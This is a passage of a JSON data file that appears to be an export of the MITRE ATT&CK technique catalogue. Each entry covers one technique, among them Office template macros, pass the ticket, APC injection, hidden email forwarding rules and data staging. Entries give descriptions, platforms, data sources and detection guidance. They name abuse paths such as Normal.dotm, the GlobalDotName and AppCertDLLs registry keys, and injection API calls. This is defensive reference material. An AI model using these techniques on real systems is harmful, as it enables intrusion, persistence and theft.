      "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2) \n\nArtifacts and evidence of symmetric key exchange may be recoverable by analyzing network traffic or looking for hard-coded values within malware. If recovered, these keys can be used to decrypt network data from command and control channels. "
    },
    "T1137.001": {
      "id": "T1137.001",
      "name": "Office Template Macros",
      "description": "Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. (Citation: Microsoft Change Normal Template)\n\nOffice Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.(Citation: enigma0x3 normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates may also be stored and pulled from remote locations.(Citation: GlobalDotName Jun 2019) \n\nWord Normal.dotm location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code>\n\nExcel Personal.xlsb location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB</code>\n\nAdversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\</code>, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.(Citation: GlobalDotName Jun 2019) \n\nAn adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1137.001",
      "stix_id": "attack-pattern--79a47ad0-fc3b-4821-9f01-a026b1ddba21",
      "created": "2019-11-07T20:29:17.788000+00:00",
      "modified": "2025-04-15T22:54:50.299000+00:00",
      "platforms": [
        "Windows",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "Windows Registry: Windows Registry Key Modification",
        "Command: Command Execution",
        "Process: Process Creation",
        "Windows Registry: Windows Registry Key Creation",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence.(Citation: CrowdStrike Outlook Forms)(Citation: Outlook Today Home Page) Modification to base templates, like Normal.dotm, should also be investigated since the base templates should likely not contain VBA macros. Changes to the Office macro security settings should also be investigated.(Citation: GlobalDotName Jun 2019)"
    },
    "T1583.003": {
      "id": "T1583.003",
      "name": "Virtual Private Server",
      "description": "Adversaries may rent Virtual Private Servers (VPSs)\u00a0that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.\n\nAcquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.(Citation: TrendmicroHideoutsLease)",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1583.003",
      "stix_id": "attack-pattern--79da0971-3147-4af6-a4f5-e8cd447cd795",
      "created": "2020-10-01T00:44:23.935000+00:00",
      "modified": "2025-04-15T23:18:46.651000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Internet Scan: Response Content",
        "Internet Scan: Response Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Once adversaries have provisioned a VPS (ex: for use as a command and control server), internet scans may reveal servers that adversaries have acquired. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021)\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control."
    },
    "T1213.001": {
      "id": "T1213.001",
      "name": "Confluence",
      "description": "\nAdversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials (i.e., [Unsecured Credentials](https://attack.mitre.org/techniques/T1552))\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1213.001",
      "stix_id": "attack-pattern--7ad38ef1-381a-406d-872a-38b136eb5ecc",
      "created": "2020-02-14T13:09:51.004000+00:00",
      "modified": "2025-04-15T22:09:18.055000+00:00",
      "platforms": [
        "SaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Logon Session: Logon Session Creation",
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": "Monitor access to Confluence repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) as these types of accounts should generally not be used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.\n\nUser access logging within Atlassian's Confluence can be configured to report access to certain pages and documents through AccessLogFilter. (Citation: Atlassian Confluence Logging) Additional log storage and analysis infrastructure will likely be required for more robust detection capabilities."
    },
    "T1550.003": {
      "id": "T1550.003",
      "name": "Pass the Ticket",
      "description": "Adversaries may \u201cpass the ticket\u201d using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\n\nWhen preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)\n\nA [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)\n\nA [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)\n\nAdversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create a valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1550.003",
      "stix_id": "attack-pattern--7b211ac6-c815-4189-93a9-ab415deca926",
      "created": "2020-01-30T17:03:43.072000+00:00",
      "modified": "2025-04-15T19:58:43.927000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "User Account: User Account Authentication",
        "Logon Session: Logon Session Creation",
        "Active Directory: Active Directory Credential Request"
      ],
      "defense_bypassed": [],
      "detection": "Audit all Kerberos authentication and credential use events and review for discrepancies. Unusual remote authentication events that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity.\n\nEvent ID 4769 is generated on the Domain Controller when using a golden ticket after the KRBTGT password has been reset twice, as mentioned in the mitigation section. The status code 0x1F indicates the action has failed due to \"Integrity check on decrypted field failed\" and indicates misuse by a previously invalidated golden ticket.(Citation: CERT-EU Golden Ticket Protection)"
    },
    "T1609": {
      "id": "T1609",
      "name": "Container Administration Command",
      "description": "Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.(Citation: Docker Daemon CLI)(Citation: Kubernetes API)(Citation: Kubernetes Kubelet)\n\nIn Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as <code>docker exec</code> to execute a command within a running container.(Citation: Docker Entrypoint)(Citation: Docker Exec) In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as <code>kubectl exec</code>.(Citation: Kubectl Exec Get Shell)",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1609",
      "stix_id": "attack-pattern--7b50a1d3-4ca7-45d1-989d-a6503f04bfe1",
      "created": "2021-03-29T16:39:26.183000+00:00",
      "modified": "2025-04-15T19:58:44.024000+00:00",
      "platforms": [
        "Containers"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Container administration service activities and executed commands can be captured through logging of process execution with command-line arguments on the container and the underlying host. In Docker, the daemon log provides insight into events at the daemon and container service level. Kubernetes system component logs may also detect activities running in and out of containers in the cluster. "
    },
    "T1083": {
      "id": "T1083",
      "name": "File and Directory Discovery",
      "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).(Citation: US-CERT-TA18-106A)\n\nSome files and directories may require elevated or specific user permissions to access.",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1083",
      "stix_id": "attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18",
      "created": "2017-05-31T21:31:04.710000+00:00",
      "modified": "2025-04-15T19:58:44.118000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Creation",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to gather file and directory information with built-in features native to the network device platform.  Monitor CLI activity for unexpected or unauthorized use of commands being run by non-standard users from non-standard locations.  "
    },
    "T1568": {
      "id": "T1568",
      "name": "Dynamic Resolution",
      "description": "Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.\n\nAdversaries may use dynamic resolution for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1568",
      "stix_id": "attack-pattern--7bd9c723-2f78-4309-82c5-47cad406572b",
      "created": "2020-03-10T17:28:11.747000+00:00",
      "modified": "2025-04-25T15:15:46.359000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Connection Creation",
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Detecting dynamically generated C2 can be challenging due to the number of different algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There are multiple approaches to detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more (Citation: Data Driven Security DGA). CDN domains may trigger these detections due to the format of their domain names. In addition to detecting algorithm generated domains based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains."
    },
    "T1036.004": {
      "id": "T1036.004",
      "name": "Masquerade Task or Service",
      "description": "Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.(Citation: TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Fysbis Dr Web Analysis)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1036.004",
      "stix_id": "attack-pattern--7bdca9d5-d500-4d7d-8c52-5fd47baf4c0c",
      "created": "2020-02-10T20:30:07.426000+00:00",
      "modified": "2025-04-15T22:48:29.215000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Scheduled Job: Scheduled Job Modification",
        "Service: Service Creation",
        "Command: Command Execution",
        "Service: Service Metadata",
        "Scheduled Job: Scheduled Job Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Look for changes to tasks and services that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks or services may show up as outlier processes that have not been seen before when compared against historical data. Monitor processes and command-line arguments for actions that could be taken to create tasks or services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement."
    },
    "T1055.004": {
      "id": "T1055.004",
      "name": "Asynchronous Procedure Call",
      "description": "Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. \n\nAPC injection is commonly performed by attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state.(Citation: Microsoft APC) A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can be used to invoke a function (such as <code>LoadLibrayA</code> pointing to a malicious DLL). \n\nA variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018) AtomBombing (Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.(Citation: Microsoft Atom Table)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process. ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1055.004",
      "stix_id": "attack-pattern--7c0f17c9-1af6-4628-9cbd-9e45482dd605",
      "created": "2020-01-14T01:29:43.786000+00:00",
      "modified": "2025-04-25T14:47:11.435000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Process: Process Access",
        "Process: Process Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, <code>QueueUserAPC</code>/<code>NtQueueApcThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. "
    },
    "T1020.001": {
      "id": "T1020.001",
      "name": "Traffic Duplication",
      "description": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)\n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)\n\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)\n\nAdversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.",
      "tactic": "exfiltration",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1020.001",
      "stix_id": "attack-pattern--7c46b364-8496-4234-8a56-f7e6727e21e1",
      "created": "2020-10-19T13:40:11.118000+00:00",
      "modified": "2025-04-15T19:58:44.474000+00:00",
      "platforms": [
        "Network Devices",
        "IaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Connection Creation",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Monitor network traffic for uncommon data flows (e.g. unusual network communications, suspicious communications that have never been seen before, communications sending fixed size data packets at regular intervals).  Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. "
    },
    "T1647": {
      "id": "T1647",
      "name": "Plist File Modification",
      "description": "Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the <code>info.plist</code> file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format.(Citation: fileinfo plist file description) \n\nAdversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e. [Hidden Window](https://attack.mitre.org/techniques/T1564/003)) or running additional commands for persistence (ex: [Launch Agent](https://attack.mitre.org/techniques/T1543/001)/[Launch Daemon](https://attack.mitre.org/techniques/T1543/004) or [Re-opened Applications](https://attack.mitre.org/techniques/T1547/007)).\n\nFor example, adversaries can add a malicious application path to the `~/Library/Preferences/com.apple.dock.plist` file, which controls apps that appear in the Dock. Adversaries can also modify the <code>LSUIElement</code> key in an application\u2019s <code>info.plist</code> file  to run the app in the background. Adversaries can also insert key-value pairs to insert environment variables, such as <code>LSEnvironment</code>, to enable persistence via [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006).(Citation: wardle chp2 persistence)(Citation: eset_osx_flashback)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1647",
      "stix_id": "attack-pattern--7d20fff9-8751-404e-badd-ccd71bda0236",
      "created": "2022-04-09T15:06:32.458000+00:00",
      "modified": "2025-04-15T22:57:13.867000+00:00",
      "platforms": [
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Creation",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for common command-line editors used to modify plist files located in auto-run locations, such as <code>\\~/LaunchAgents</code>, <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>, and an application's <code>Info.plist</code>. \n\nMonitor for plist file modification immediately followed by code execution from <code>\\~/Library/Scripts</code> and <code>~/Library/Preferences</code>. Also, monitor for significant changes to any path pointers in a modified plist.\n\nIdentify new services executed from plist modified in the previous user's session. "
    },
    "T1127.003": {
      "id": "T1127.003",
      "name": "JamPlus",
      "description": "Adversaries may use `JamPlus` to proxy the execution of a malicious script. `JamPlus` is a build utility tool for code and data build systems. It works with several popular compilers and can be used for generating workspaces in code editors such as Visual Studio.(Citation: JamPlus manual)\n\nAdversaries may abuse the `JamPlus` build utility to execute malicious scripts via a `.jam` file, which describes the build process and required dependencies. Because the malicious script is executed from a reputable developer tool, it may subvert application control security systems such as Smart App Control.(Citation: Cyble)(Citation: Elastic Security Labs)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1127.003",
      "stix_id": "attack-pattern--7d356151-a69d-404e-896b-71618952702a",
      "created": "2025-03-21T13:36:48.710000+00:00",
      "modified": "2025-04-17T21:42:31.066000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1546.009": {
      "id": "T1546.009",
      "name": "AppCert DLLs",
      "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code> Registry key under <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions <code>CreateProcess</code>, <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>, or <code>WinExec</code>. (Citation: Elastic Process Injection July 2017)\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity. ",
      "tactic": "privilege-escalation",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1546.009",
      "stix_id": "attack-pattern--7d57b371-10c2-45e5-b3cc-83a8fb380e4c",
      "created": "2020-01-24T14:47:41.795000+00:00",
      "modified": "2025-04-15T19:58:44.894000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Module: Module Load",
        "Command: Command Execution",
        "Process: OS API Execution",
        "Windows Registry: Windows Registry Key Modification",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Monitor the AppCertDLLs Registry value for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as RegCreateKeyEx and RegSetValueEx. (Citation: Elastic Process Injection July 2017) \n\nTools such as Sysinternals Autoruns may overlook AppCert DLLs as an auto-starting location. (Citation: TechNet Autoruns) (Citation: Sysinternals AppCertDlls Oct 2007)\n\nLook for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement."
    },
    "T1114.003": {
      "id": "T1114.003",
      "name": "Email Forwarding Rule",
      "description": "Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim\u2019s organization to use as part of further exploits or operations.(Citation: US-CERT TA18-068A 2018) Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators.(Citation: Pfammatter - Hidden Inbox Rules) Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)(Citation: Mac Forwarding Rules)\n\nAny user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.(Citation: Pfammatter - Hidden Inbox Rules)\n\nIn some environments, administrators may be able to enable email forwarding rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to enable forwarding on all or specific mail an organization receives. ",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1114.003",
      "stix_id": "attack-pattern--7d77a07d-02fe-4e88-8bd9-e9c008c01bf0",
      "created": "2020-02-19T18:54:47.103000+00:00",
      "modified": "2025-04-15T22:26:55.201000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Application Log: Application Log Content",
        "Cloud Service: Cloud Service Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Detection is challenging because all messages forwarded because of an auto-forwarding rule have the same presentation as a manually forwarded message. It is also possible for the user to not be aware of the addition of such an auto-forwarding rule and not suspect that their account has been compromised; email-forwarding rules alone will not affect the normal usage patterns or operations of the email account. This is especially true in cases with hidden auto-forwarding rules. This makes it only possible to reliably detect the existence of a hidden auto-forwarding rule by examining message tracking logs or by using a MAPI editor to notice the modified rule property values.(Citation: Pfammatter - Hidden Inbox Rules)\n\nAuto-forwarded messages generally contain specific detectable artifacts that may be present in the header; such artifacts would be platform-specific. Examples include `X-MS-Exchange-Organization-AutoForwarded` set to true, `X-MailFwdBy` and `X-Forwarded-To`. The `forwardingSMTPAddress` parameter used in a forwarding process that is managed by administrators and not by user actions. All messages for the mailbox are forwarded to the specified SMTP address. However, unlike typical client-side rules, the message does not appear as forwarded in the mailbox; it appears as if it were sent directly to the specified destination mailbox.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2) High volumes of emails that bear the `X-MS-Exchange-Organization-AutoForwarded` header (indicating auto-forwarding) without a corresponding number of emails that match the appearance of a forwarded message may indicate that further investigation is needed at the administrator level rather than user-level."
    },
    "T1074": {
      "id": "T1074",
      "name": "Data Staged",
      "description": "Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.(Citation: PWC Cloud Hopper April 2017)\n\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)\n\nAdversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1074",
      "stix_id": "attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e",
      "created": "2017-05-31T21:30:58.938000+00:00",
      "modified": "2025-04-15T19:58:45.225000+00:00",
      "platforms": [
        "Windows",
        "IaaS",
        "Linux",
        "macOS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Access",
        "File: File Creation",
        "Windows Registry: Windows Registry Key Modification",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nConsider monitoring accesses and modifications to storage repositories (such as the Windows Registry), especially from suspicious processes that could be related to malicious data collection."
    },
    "T1649": {
      "id": "T1649",
      "name": "Steal or Forge Authentication Certificates",
